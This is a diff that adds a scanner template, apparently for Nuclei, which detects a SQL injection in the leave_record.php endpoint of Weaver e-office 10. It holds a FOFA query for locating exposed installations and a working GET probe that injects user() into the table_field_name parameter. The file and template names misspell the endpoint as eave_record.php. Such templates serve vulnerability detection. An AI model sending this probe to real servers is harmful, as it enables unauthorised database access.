@@ -1,0 +1,30 @@
+id: 泛微 eave_record.php SQL
+
+info:
+  name: 泛微 eave_record.php 存在SQL注入漏洞
+  severity: medium
+  description:  泛微 e-cology-v10 run_id参数过滤不严，攻击者可获取数据库信息和服务权限
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  tags: fanwei,ecology,exposure,config
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1&table_field=1&table_field_name=user()&max_rows=10"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<div class="empty-tip">'
+        condition: and
+
+
+      - type: status
+        status:
+          - 200
